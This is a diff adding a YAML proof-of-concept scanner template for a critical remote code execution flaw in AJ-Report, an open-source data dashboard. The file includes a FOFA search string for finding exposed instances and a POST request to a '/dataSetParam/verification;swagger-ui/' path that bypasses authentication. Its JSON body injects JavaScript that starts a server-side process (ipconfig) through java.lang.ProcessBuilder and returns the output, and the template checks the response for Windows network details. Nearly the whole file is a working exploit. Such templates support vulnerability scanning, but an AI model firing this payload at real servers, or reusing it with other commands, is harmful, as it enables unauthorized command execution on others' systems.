@@ -1,0 +1,22 @@
+id: poc-yaml-aj-report-verification-swagger-ui-rce
+info:
+  name: AJ-Report开源数据大屏 verification;swagger-ui 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: aj-report
+  fofa: title="AJ-Report"
+requests:
+- method: POST
+  path: /dataSetParam/verification;swagger-ui/
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function
+    verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new
+    java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line =
+    r.readLine()) != null){ss+=line};return ss;}"}'
+  expression: "status_code == 200 && \ncontains(body,\"操作成功\") &&\ncontains(body,\"\
+    Windows IP\") &&\ncontains(body,\"IPv4 Address\") &&\ncontains(body,\"DNS\") &&\n\
+    contains(content_type,\"application/json\")\n"
+variables: {}
+transport: http
